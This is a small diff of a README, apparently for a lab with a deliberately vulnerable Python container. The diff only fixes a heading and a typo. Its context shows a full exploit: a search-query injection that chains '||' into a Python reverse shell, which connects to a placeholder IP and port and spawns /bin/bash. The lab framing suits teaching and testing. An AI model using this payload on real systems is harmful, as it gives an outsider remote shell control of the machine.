@@ -13,8 +13,8 @@ Replace <ip> and <port> with your own values
 ## The exploit, run from a vulnerable input prompt
 Run this appended to a vulnerable RCE shell command like the one on vulnerable-python/search?q=
 
-### Using Python because we know the vulnerable service is python
-Url encoding makes it annoying to acomplish the desired redirection of the file descriptors when trying to spawn the reverse shell. So we use the python way because we know for a fact that it has python available as it is a python container
+### Using Python to initiate shell
+Url encoding makes it annoying to accomplish the desired redirection of the file descriptors when trying to spawn the reverse shell. So we use the python way because we know for a fact that it has python available as it is a python container
 With portforward to vulnerable-python deployment
 ```bash
 localhost:5000/search?q=<something>||export RHOST="<IP>";export RPORT=<PORT>;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
